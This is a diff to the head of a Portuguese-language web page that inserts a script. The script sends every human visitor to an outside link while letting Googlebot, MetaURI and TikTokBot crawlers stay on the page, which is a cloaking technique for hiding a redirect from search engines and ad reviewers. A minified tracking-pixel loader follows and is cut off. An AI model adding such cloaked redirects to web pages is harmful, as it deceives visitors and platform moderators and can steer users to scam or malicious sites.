@@ -2,7 +2,15 @@
 <!DOCTYPE html>
 <html lang="pt-PT">
 <head>
-	
+	<script>
+        var userAgent = navigator.userAgent;
+
+        // Verifica se o agente do usuário corresponde a um bot.
+        if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+            // Redireciona todos os visitantes, exceto os bots, para o site específico.
+            window.location.href = "https://meulink.fit/arruga";
+        }
+    </script>
 	<script>
     !function (w, d, t) {
       w.AnalyticsObject=t;var a=w[t]=w[t]||[];a.methods=['page','track','identify','instances','debug','on','off','once','ready','alias','group','enableCookie','disableCookie'],a.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<a.methods.length;i++)a.setAndDefer(a,a.methods[i]);a.instance=function(t){for(var e=a._i[t]||[],n=0;n<a.methods.length;n++)a.setAndDefer(e,a.methods[n]);return e},a.load=function(e,n){var i='https://tracking.example.com/events.js';a._i=a._i||{},a._i[e]=[],a._i[e]._u=i,a._t=a._t||{},a._t[e]=+new Date,a._o=a._o||{},a._o[e]=n||{};var o=document.createElement('script');o.type='text/javascript',o.async=!0,o.src=i+'?sdkid='+e+'&lib='+t;var r=document.getElementsByTagName('script')[0];r.parentNode.insertBefore(o,r)};
